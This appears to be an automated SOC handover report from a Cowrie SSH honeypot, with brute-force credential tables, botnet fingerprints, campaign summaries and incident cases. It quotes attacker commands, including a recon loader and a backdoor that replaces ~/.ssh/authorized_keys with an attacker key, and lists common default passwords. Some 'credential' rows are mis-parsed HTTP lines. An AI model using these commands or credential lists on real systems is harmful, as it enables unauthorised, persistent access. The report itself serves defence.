# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-26 |
| **Generated At** | 2026-07-26T10:04:27Z |
| **Shift Time** | 10:04 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **390** |
| Confirmed Threats | **352** |
| False Positives Filtered | **38** (9.7%) |
| Unique Attacker IPs | **151** |
| Countries of Origin | **34** |
| High Severity Cases | **229** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **161** |
| Malware Samples Analyzed | **3** HIGH · **32** MED · 12 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **263** |
| Unique Credential Pairs | **174** |
| Unique Usernames | **31** |
| Unique Passwords | **114** |
| Successful Auth Pairs | **236** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 79 |
| `admin` | 34 |
| `git` | 16 |
| `developer` | 15 |
| `centos` | 13 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 15 |
| `password` | 8 |
| `123456` | 8 |
| `support` | 8 |
| `123` | 6 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 10 |
| `support` | `support` | 8 |
| `root` | `LeitboGi0ro` | 6 |
| `nobody` | `555555` | 5 |
| `supervisor` | `supervisor2007` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `POST /api HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.92` | 2026-07-26T04:55:06 |
| `POST /_next/server HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.92` | 2026-07-26T04:55:19 |
| `POST /app HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.92` | 2026-07-26T04:55:31 |
| `backup` | `password` | `195.178.110.228` | 2026-07-26T04:55:42 |
| `POST /api/route HTTP/1.1` | `Host: 129.80.119.236:2323` | `160.119.71.92` | 2026-07-26T04:55:43 |
| `developer` | `1` | `195.178.110.228` | 2026-07-26T04:57:19 |
| `config` | `9` | `10.0.0.73` | 2026-07-26T04:57:28 |
| `developer` | `123` | `195.178.110.228` | 2026-07-26T04:58:54 |
| `developer` | `1234` | `195.178.110.228` | 2026-07-26T05:00:26 |
| `centos` | `centos777` | `78.189.17.35` | 2026-07-26T05:01:56 |
| `developer` | `12345` | `195.178.110.228` | 2026-07-26T05:01:59 |
| `ubnt` | `888` | `122.186.249.6` | 2026-07-26T05:02:38 |
| `developer` | `123456` | `195.178.110.228` | 2026-07-26T05:03:29 |
| `developer` | `1234567` | `195.178.110.228` | 2026-07-26T05:04:55 |
| `ubnt` | `888` | `111.53.131.79` | 2026-07-26T05:05:45 |
| `developer` | `12345678` | `195.178.110.228` | 2026-07-26T05:06:28 |
| `developer` | `123456789` | `195.178.110.228` | 2026-07-26T05:08:09 |
| `developer` | `1234567890` | `195.178.110.228` | 2026-07-26T05:09:48 |
| `developer` | `abc123` | `195.178.110.228` | 2026-07-26T05:11:28 |
| `developer` | `admin` | `195.178.110.228` | 2026-07-26T05:13:07 |
| `root` | `admin` | `130.12.180.174` | 2026-07-26T05:13:52 |
| `root` | `` | `94.154.43.220` | 2026-07-26T05:14:17 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-26T05:14:35 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-26T05:14:36 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-26T05:14:37 |
| `developer` | `dev` | `195.178.110.228` | 2026-07-26T05:14:49 |
| `support` | `support` | `176.53.159.196` | 2026-07-26T05:15:55 |
| `developer` | `developer` | `195.178.110.228` | 2026-07-26T05:16:31 |
| `support` | `support` | `10.0.0.73` | 2026-07-26T05:17:16 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-26T05:18:05 |
| `user` | `888` | `111.70.23.238` | 2026-07-26T05:18:09 |
| `developer` | `password` | `195.178.110.228` | 2026-07-26T05:18:09 |
| `developer` | `qwerty` | `195.178.110.228` | 2026-07-26T05:19:45 |
| `admin` | `admin` | `195.178.110.137` | 2026-07-26T05:20:20 |
| `docker` | `123` | `195.178.110.228` | 2026-07-26T05:21:25 |
| `docker` | `123456` | `195.178.110.228` | 2026-07-26T05:23:01 |
| `docker` | `12345678` | `195.178.110.228` | 2026-07-26T05:24:37 |
| `config` | `44` | `211.253.10.61` | 2026-07-26T05:26:13 |
| `docker` | `123456789` | `195.178.110.228` | 2026-07-26T05:26:15 |
| `config` | `44` | `223.223.194.187` | 2026-07-26T05:26:28 |
| `blank` | `7` | `103.68.52.210` | 2026-07-26T05:26:58 |
| `blank` | `7` | `14.194.128.158` | 2026-07-26T05:27:06 |
| `docker` | `docker` | `195.178.110.228` | 2026-07-26T05:27:52 |
| `docker` | `root` | `195.178.110.228` | 2026-07-26T05:29:31 |
| `blank` | `7` | `60.249.252.94` | 2026-07-26T05:30:25 |
| `blank` | `7` | `92.126.223.175` | 2026-07-26T05:30:32 |
| `ec2-user` | `123456` | `195.178.110.228` | 2026-07-26T05:31:13 |
| `ec2-user` | `12345678` | `195.178.110.228` | 2026-07-26T05:32:57 |
| `ec2-user` | `password` | `195.178.110.228` | 2026-07-26T05:34:40 |
| `ftp` | `123` | `195.178.110.228` | 2026-07-26T05:36:23 |
| `ftp` | `123456` | `195.178.110.228` | 2026-07-26T05:38:06 |
| `ftp` | `admin` | `195.178.110.228` | 2026-07-26T05:39:48 |
| `ftp` | `anonymous` | `195.178.110.228` | 2026-07-26T05:41:31 |
| `ftp` | `ftp` | `195.178.110.228` | 2026-07-26T05:43:12 |
| `ftp` | `ftpuser` | `195.178.110.228` | 2026-07-26T05:44:54 |
| `guest` | `6666666` | `10.0.0.73` | 2026-07-26T05:46:27 |
| `git` | `123` | `195.178.110.228` | 2026-07-26T05:46:34 |
| `operator` | `operator222` | `220.246.41.171` | 2026-07-26T05:47:20 |
| `operator` | `operator222` | `180.76.52.146` | 2026-07-26T05:47:34 |
| `git` | `123123` | `195.178.110.228` | 2026-07-26T05:48:08 |
| `git` | `1234` | `195.178.110.228` | 2026-07-26T05:49:41 |
| `root` | `﻿------fuck------` | `154.221.24.172` | 2026-07-26T05:50:17 |
| `operator` | `operator222` | `10.0.0.73` | 2026-07-26T05:51:13 |
| `git` | `12345` | `195.178.110.228` | 2026-07-26T05:51:19 |
| `git` | `123456` | `195.178.110.228` | 2026-07-26T05:52:57 |
| `git` | `12345678` | `195.178.110.228` | 2026-07-26T05:54:37 |
| `unknown` | `444` | `10.0.0.73` | 2026-07-26T05:55:17 |
| `git` | `123456789` | `195.178.110.228` | 2026-07-26T05:56:14 |
| `git` | `admin` | `195.178.110.228` | 2026-07-26T05:57:54 |
| `git` | `code` | `195.178.110.228` | 2026-07-26T05:59:36 |
| `git` | `git` | `195.178.110.228` | 2026-07-26T06:01:20 |
| `admin` | `admin` | `34.22.226.141` | 2026-07-26T06:02:56 |
| `git` | `git123` | `195.178.110.228` | 2026-07-26T06:02:57 |
| `git` | `github` | `195.178.110.228` | 2026-07-26T06:04:35 |
| `git` | `gitlab` | `195.178.110.228` | 2026-07-26T06:06:17 |
| `ubnt` | `ubnt11` | `14.54.22.11` | 2026-07-26T06:07:16 |
| `git` | `passw0rd` | `195.178.110.228` | 2026-07-26T06:08:03 |
| `root` | `` | `94.154.43.254` | 2026-07-26T06:08:32 |
| `admin` | `admin` | `94.154.43.254` | 2026-07-26T06:08:37 |
| `git` | `password` | `195.178.110.228` | 2026-07-26T06:09:48 |
| `ubnt` | `ubnt11` | `116.228.195.251` | 2026-07-26T06:10:40 |
| `ubnt` | `ubnt11` | `10.0.0.73` | 2026-07-26T06:11:07 |
| `git` | `qwerty` | `195.178.110.228` | 2026-07-26T06:11:36 |
| `guest` | `1` | `195.178.110.228` | 2026-07-26T06:13:27 |
| `centos` | `7777` | `195.222.57.190` | 2026-07-26T06:15:03 |
| `centos` | `7777` | `187.8.120.90` | 2026-07-26T06:15:11 |
| `guest` | `123` | `195.178.110.228` | 2026-07-26T06:15:15 |
| `centos` | `7777` | `10.0.0.73` | 2026-07-26T06:15:26 |
| `test` | `333` | `82.102.149.88` | 2026-07-26T06:15:55 |
| `guest` | `1234` | `195.178.110.228` | 2026-07-26T06:17:03 |
| `guest` | `12345` | `195.178.110.228` | 2026-07-26T06:18:48 |
| `test` | `333` | `211.238.237.254` | 2026-07-26T06:19:23 |
| `guest` | `123456` | `195.178.110.228` | 2026-07-26T06:20:30 |
| `root` | `﻿------fuck------` | `10.0.0.73` | 2026-07-26T06:20:34 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-26T06:23:04 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-26T06:23:04 |
| `root` | `666666` | `2.26.50.151` | 2026-07-26T06:31:08 |
| `345gs5662d34` | `345gs5662d34` | `2.26.50.151` | 2026-07-26T06:31:10 |
| `root` | `3245gs5662d34` | `2.26.50.151` | 2026-07-26T06:31:11 |
| `mysql` | `1234567` | `138.118.215.192` | 2026-07-26T06:31:53 |
| `mysql` | `1234567` | `114.30.223.119` | 2026-07-26T06:32:02 |
| `mysql` | `1234567` | `58.17.6.119` | 2026-07-26T06:35:11 |
| `mysql` | `1234567` | `181.129.31.42` | 2026-07-26T06:35:24 |
| `root` | `rootpass` | `193.24.211.76` | 2026-07-26T06:35:30 |
| `root` | `111111` | `92.118.39.77` | 2026-07-26T06:38:05 |
| `root` | `Cloud@123` | `120.52.18.158` | 2026-07-26T06:38:10 |
| `345gs5662d34` | `345gs5662d34` | `120.52.18.158` | 2026-07-26T06:38:15 |
| `root` | `3245gs5662d34` | `120.52.18.158` | 2026-07-26T06:38:17 |
| `postgres` | `password` | `65.20.251.41` | 2026-07-26T06:39:42 |
| `postgres` | `password` | `179.184.85.167` | 2026-07-26T06:39:50 |
| `root` | `123` | `92.118.39.77` | 2026-07-26T06:39:55 |
| `postgres` | `password` | `10.0.0.73` | 2026-07-26T06:40:12 |
| `centos` | `centos11` | `200.232.114.71` | 2026-07-26T06:40:36 |
| `centos` | `centos11` | `65.20.202.4` | 2026-07-26T06:40:43 |
| `root` | `123123` | `92.118.39.77` | 2026-07-26T06:41:51 |
| `root` | `123321` | `92.118.39.77` | 2026-07-26T06:43:47 |
| `centos` | `centos11` | `222.86.168.224` | 2026-07-26T06:44:05 |
| `centos` | `centos11` | `175.43.184.223` | 2026-07-26T06:44:14 |
| `root` | `1234` | `92.118.39.77` | 2026-07-26T06:45:42 |
| `root` | `12345` | `92.118.39.77` | 2026-07-26T06:47:37 |
| `root` | `1234567` | `92.118.39.77` | 2026-07-26T06:51:23 |
| `root` | `12345678` | `92.118.39.77` | 2026-07-26T06:53:17 |
| `root` | `123456789` | `92.118.39.77` | 2026-07-26T06:55:12 |
| `config` | `444444` | `75.80.65.214` | 2026-07-26T06:56:27 |
| `root` | `1234abcd` | `92.118.39.77` | 2026-07-26T06:57:06 |
| `root` | `123abc` | `92.118.39.77` | 2026-07-26T06:59:03 |
| `config` | `444444` | `196.189.124.229` | 2026-07-26T06:59:49 |
| `config` | `444444` | `49.206.194.29` | 2026-07-26T06:59:58 |
| `root` | `123qwe` | `92.118.39.77` | 2026-07-26T07:01:00 |
| `root` | `1q2w3e` | `92.118.39.77` | 2026-07-26T07:02:58 |
| `root` | `1q2w3e4r` | `92.118.39.77` | 2026-07-26T07:04:48 |
| `root` | `1qaz2wsx` | `92.118.39.77` | 2026-07-26T07:06:33 |
| `root` | `654321` | `92.118.39.77` | 2026-07-26T07:08:17 |
| `root` | `P@ssw0rd` | `92.118.39.77` | 2026-07-26T07:10:04 |
| `admin` | `admin` | `47.85.8.171` | 2026-07-26T07:10:31 |
| `admin` | `admin` | `130.12.180.51` | 2026-07-26T07:10:31 |
| `root` | `P@ssword` | `92.118.39.77` | 2026-07-26T07:11:53 |
| `root` | `Root123` | `92.118.39.77` | 2026-07-26T07:13:47 |
| `root` | `admin` | `92.118.39.77` | 2026-07-26T07:15:36 |
| `root` | `admin123` | `92.118.39.77` | 2026-07-26T07:17:21 |
| `root` | `letmein` | `92.118.39.77` | 2026-07-26T07:19:05 |
| `root` | `passw0rd` | `92.118.39.77` | 2026-07-26T07:20:55 |
| `nobody` | `555555` | `178.178.222.61` | 2026-07-26T07:21:09 |
| `nobody` | `555555` | `217.24.185.98` | 2026-07-26T07:21:16 |
| `root` | `password` | `92.118.39.77` | 2026-07-26T07:22:47 |
| `nobody` | `555555` | `179.185.1.97` | 2026-07-26T07:24:24 |
| `nobody` | `555555` | `211.223.41.90` | 2026-07-26T07:24:37 |
| `root` | `password1` | `92.118.39.77` | 2026-07-26T07:24:38 |
| `nobody` | `555555` | `10.0.0.73` | 2026-07-26T07:24:47 |
| `admin` | `admin` | `194.85.235.99` | 2026-07-26T07:25:25 |
| `root` | `qwerty` | `92.118.39.77` | 2026-07-26T07:26:29 |
| `root` | `r00t` | `92.118.39.77` | 2026-07-26T07:28:27 |
| `guest` | `5555` | `180.188.253.150` | 2026-07-26T07:28:59 |
| `guest` | `5555` | `178.178.194.131` | 2026-07-26T07:29:07 |
| `guest` | `5555` | `10.0.0.73` | 2026-07-26T07:29:19 |
| `root` | `root!@#` | `92.118.39.77` | 2026-07-26T07:31:53 |
| `debian` | `888` | `119.160.166.237` | 2026-07-26T07:33:19 |
| `root` | `root#123` | `92.118.39.77` | 2026-07-26T07:33:36 |
| `debian` | `888` | `10.0.0.73` | 2026-07-26T07:33:44 |
| `root` | `root0000` | `92.118.39.77` | 2026-07-26T07:35:16 |
| `root` | `root1111` | `92.118.39.77` | 2026-07-26T07:36:57 |
| `root` | `root123` | `92.118.39.77` | 2026-07-26T07:38:39 |
| `root` | `root1234` | `92.118.39.77` | 2026-07-26T07:40:25 |
| `root` | `Spider123` | `165.101.250.39` | 2026-07-26T07:40:54 |
| `345gs5662d34` | `345gs5662d34` | `165.101.250.39` | 2026-07-26T07:40:58 |
| `root` | `3245gs5662d34` | `165.101.250.39` | 2026-07-26T07:41:00 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:2323` | `147.185.132.197` | 2026-07-26T07:41:52 |
| `root` | `root2024` | `92.118.39.77` | 2026-07-26T07:42:12 |
| `root` | `root2025` | `92.118.39.77` | 2026-07-26T07:43:54 |
| `root` | `root2222` | `92.118.39.77` | 2026-07-26T07:45:37 |
| `ban` | `ban` | `187.34.131.136` | 2026-07-26T07:45:56 |
| `345gs5662d34` | `345gs5662d34` | `187.34.131.136` | 2026-07-26T07:45:59 |
| `ban` | `3245gs5662d34` | `187.34.131.136` | 2026-07-26T07:46:01 |
| `root` | `root4444` | `92.118.39.77` | 2026-07-26T07:47:23 |
| `root` | `root5555` | `92.118.39.77` | 2026-07-26T07:49:11 |
| `config` | `22` | `202.82.20.241` | 2026-07-26T07:49:15 |
| `config` | `22` | `10.0.0.73` | 2026-07-26T07:49:34 |
| `debian` | `333` | `27.128.162.146` | 2026-07-26T07:50:17 |
| `root` | `root5678` | `92.118.39.77` | 2026-07-26T07:50:57 |
| `root` | `root6666` | `92.118.39.77` | 2026-07-26T07:52:52 |
| `debian` | `333` | `10.0.0.73` | 2026-07-26T07:53:56 |
| `root` | `root9999` | `92.118.39.77` | 2026-07-26T07:54:43 |
| `root` | `root@123` | `92.118.39.77` | 2026-07-26T07:56:29 |
| `root` | `rootaccess` | `92.118.39.77` | 2026-07-26T07:58:11 |
| `admin` | `333` | `10.0.0.73` | 2026-07-26T07:58:14 |
| `root` | `rootadmin` | `92.118.39.77` | 2026-07-26T07:59:58 |
| `root` | `rootme` | `92.118.39.77` | 2026-07-26T08:01:37 |
| `root` | `rootpass` | `92.118.39.77` | 2026-07-26T08:03:14 |
| `root` | `rootpw` | `92.118.39.77` | 2026-07-26T08:04:50 |
| `root` | `rootroot` | `92.118.39.77` | 2026-07-26T08:06:27 |
| `root` | `toor` | `92.118.39.77` | 2026-07-26T08:08:04 |
| `root` | `welcome` | `92.118.39.77` | 2026-07-26T08:09:40 |
| `supervisor` | `supervisor2007` | `132.251.255.162` | 2026-07-26T08:10:25 |
| `supervisor` | `supervisor2007` | `27.39.130.144` | 2026-07-26T08:10:33 |
| `admin` | `1234` | `92.118.39.77` | 2026-07-26T08:11:15 |
| `admin` | `12345` | `92.118.39.77` | 2026-07-26T08:12:52 |
| `supervisor` | `supervisor2007` | `65.20.191.231` | 2026-07-26T08:13:42 |
| `supervisor` | `supervisor2007` | `10.0.0.73` | 2026-07-26T08:14:11 |
| `admin` | `123456` | `92.118.39.77` | 2026-07-26T08:14:29 |
| `user` | `55555` | `221.120.57.125` | 2026-07-26T08:14:44 |
| `admin` | `123456789` | `92.118.39.77` | 2026-07-26T08:16:04 |
| `admin` | `123qwe` | `92.118.39.77` | 2026-07-26T08:17:38 |
| `user` | `55555` | `85.159.164.28` | 2026-07-26T08:18:01 |
| `user` | `55555` | `10.0.0.73` | 2026-07-26T08:18:19 |
| `admin` | `123qwerty` | `92.118.39.77` | 2026-07-26T08:19:13 |
| `admin` | `21` | `92.118.39.77` | 2026-07-26T08:20:49 |
| `admin` | `321` | `92.118.39.77` | 2026-07-26T08:22:23 |
| `admin` | `654321` | `92.118.39.77` | 2026-07-26T08:24:01 |
| `admin` | `Admin@123` | `92.118.39.77` | 2026-07-26T08:25:44 |
| `admin` | `P@ssw0rd` | `92.118.39.77` | 2026-07-26T08:27:26 |
| `admin` | `Password` | `92.118.39.77` | 2026-07-26T08:29:10 |
| `admin` | `admin` | `92.118.39.77` | 2026-07-26T08:30:53 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `65.49.1.122` | 2026-07-26T08:31:16 |
| `admin` | `admin#123` | `92.118.39.77` | 2026-07-26T08:32:35 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-26T08:33:23 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-26T08:33:23 |
| `admin` | `admin1` | `92.118.39.77` | 2026-07-26T08:34:17 |
| `admin` | `admin12` | `92.118.39.77` | 2026-07-26T08:35:59 |
| `admin` | `admin123` | `92.118.39.77` | 2026-07-26T08:37:43 |
| `default` | `1111111` | `10.0.0.73` | 2026-07-26T08:38:49 |
| `postgres` | `1234567890` | `61.169.54.150` | 2026-07-26T08:39:21 |
| `admin` | `admin2024` | `92.118.39.77` | 2026-07-26T08:39:28 |
| `postgres` | `1234567890` | `223.100.248.64` | 2026-07-26T08:39:31 |
| `admin` | `admin@123` | `92.118.39.77` | 2026-07-26T08:41:10 |
| `postgres` | `1234567890` | `211.247.127.250` | 2026-07-26T08:42:36 |
| `postgres` | `1234567890` | `117.177.235.249` | 2026-07-26T08:42:46 |
| `admin` | `adminadmin` | `92.118.39.77` | 2026-07-26T08:42:52 |
| `centos` | `centos000` | `183.104.220.84` | 2026-07-26T08:43:44 |
| `centos` | `centos000` | `31.173.0.26` | 2026-07-26T08:43:53 |
| `admin` | `default` | `92.118.39.77` | 2026-07-26T08:44:33 |
| `admin` | `letmein` | `92.118.39.77` | 2026-07-26T08:46:14 |
| `centos` | `centos000` | `112.161.26.125` | 2026-07-26T08:47:00 |
| `centos` | `centos000` | `50.187.155.130` | 2026-07-26T08:47:11 |
| `centos` | `centos000` | `10.0.0.73` | 2026-07-26T08:47:28 |
| `admin` | `pa$w0rd` | `92.118.39.77` | 2026-07-26T08:47:52 |
| `admin` | `pass@123` | `92.118.39.77` | 2026-07-26T08:49:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **390** |
| Sessions with Fingerprint | **23** |
| Unique HASSH Fingerprints | **23** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 143 |
| OpenSSH | 56 |
| libssh | 37 |
| Paramiko (Python) | 14 |
| Nmap scanner | 7 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 128 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 55 | 54 |
| `a2de0f306611...` | Mirai/variant | 14 | 3 |
| `f555226df196...` | Mirai/variant | 13 | 5 |
| `e788c657d1a2...` | Mirai/variant | 6 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 128 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 55 | 54 | Mirai/variant |
| `95420f9d932d...` | libssh | 18 | 8 | — |
| `a2de0f306611...` | Paramiko (Python) | 14 | 3 | Mirai/variant |
| `f555226df196...` | libssh | 13 | 5 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 4 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 3 | 3 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **12** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 126 | 2 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 2 | `T1082, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.77`, `195.178.110.228`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `94.154.43.220`, `94.154.43.254`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `2.26.50.151`, `165.101.250.39`, `120.52.18.158`, `187.34.131.136`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **151** |
| Unique ASNs | **93** |
| High-Risk ASNs | **76** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 10 | MEDIUM |
| `AS398324` | Censys, Inc. | 8 | HIGH |
| `AS4766` | Korea Telecom | 5 | HIGH |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS22773` | Cox Communications Inc. | 4 | MEDIUM |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (228)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-b944a957216e

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]92` |
| **First Seen** | 2026-07-26 04:55 |
| **Last Seen** | 2026-07-26 04:55 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 517, Connection: close, User-Agent: Mozilla/5.0 (Linux; Android 14; SM-F9560 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/127.0.6533.103 Mobile Safari/537.36, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:55:06` | `cowrie.session.connect` |
| `2026-07-26 04:55:06` | `cowrie.login.success` |
| `2026-07-26 04:55:07` | `cowrie.session.params` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.failed` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.failed` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.failed` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.failed` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.failed` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.failed` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.failed` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.failed` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.failed` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.failed` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.failed` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.failed` |
| `2026-07-26 04:55:07` | `cowrie.command.input` |
| `2026-07-26 04:55:07` | `cowrie.command.failed` |
| `2026-07-26 04:55:18` | `cowrie.log.closed` |
| `2026-07-26 04:55:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.119.71[.]92` to AbuseIPDB if not already reported
- [ ] Block `160.119.71[.]92` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-260308248df3

| Field | Detail |
|---|---|
| **Source IP** | `160.119.71[.]92` |
| **First Seen** | 2026-07-26 04:55 |
| **Last Seen** | 2026-07-26 04:55 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Content-Length: 517, Connection: close, User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, deflate, Next-Action: x` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 04:55:18` | `cowrie.session.connect` |
| `2026-07-26 04:55:19` | `cowrie.login.success` |
| `2026-07-26 04:55:20` | `cowrie.session.params` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.failed` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.failed` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.failed` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.failed` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.failed` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.failed` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
| `2026-07-26 04:55:20` | `cowrie.command.failed` |
| `2026-07-26 04:55:20` | `cowrie.command.input` |
